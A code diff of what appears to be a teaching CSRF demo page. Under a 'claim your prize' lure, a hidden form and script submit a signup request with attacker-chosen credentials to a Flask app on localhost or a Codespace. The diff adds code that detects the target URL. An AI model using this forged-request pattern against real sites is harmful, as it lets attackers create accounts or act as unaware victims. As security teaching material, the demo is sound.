@@ -85,7 +85,7 @@
             <h1>The whole team is so proud of you, click below to claim your prize</h1>
         </header>
         <section class="intro">
-            <form hidden id="hack" target="csrf-frame" action="http://localhost:5000/signup.html" method="POST" autocomplete="off">
+            <form hidden id="hack" target="csrf-frame" action="" method="POST" autocomplete="off">
                 <input id="username" name="username" value="give_me_access">
                 <input name="password" value="abc123">
                 <input name="dob" value="01/01/2001">
@@ -96,14 +96,34 @@
             <div id="warning"></div>
             <script>
                 function hack() {
+                    // Detect the correct Flask app URL for different environments
+                    let baseUrl = '';
+                    
+                    if (window.location.hostname.includes('app.github.dev')) {
+                        // Codespaces environment with app.github.dev format
+                        // Example: miniature-spork-pj7p6g4rjgg37pwv-5500.app.github.dev -> miniature-spork-pj7p6g4rjgg37pwv-5000.app.github.dev
+                        baseUrl = window.location.protocol + '//' + window.location.hostname.replace('-5500', '-5000');
+                    } else if (window.location.hostname.includes('github.dev') || window.location.hostname.includes('githubpreview.dev')) {
+                        // Other Codespaces URL formats
+                        baseUrl = window.location.protocol + '//' + window.location.hostname.replace('5500', '5000');
+                    } else {
+                        // Local environment
+                        baseUrl = 'http://localhost:5000';
+                    }
+                    
+                    // Set the form action URL
+                    document.getElementById("hack").action = baseUrl + '/signup.html';
+                    
                     //Generate a random username
                     let username = "Hacker_"
                     username += Math.random().toString(36).substring(2, 4) + Math.random().toString(36).substring(2, 4);
                     document.getElementById("username").value = username;
+                    
                     // Submit a HTTP POST request to the target site
                     document.getElementById("hack").submit();
+                    
                     // Display a warning message
-                    document.getElementById("warning").innerHTML="<p>HA HA HA! You have been hacked!</p><p>Go on, check your user database, we can log into your site with the username: " + username + "</p>";
+                    document.getElementById("warning").innerHTML="<p>HA HA HA! You have been hacked!</p><p>Go on, check your user database, we can log into your site with the username: " + username + "</p><p>Target URL: " + baseUrl + "/signup.html</p>";
                 }
             </script>
             <script>
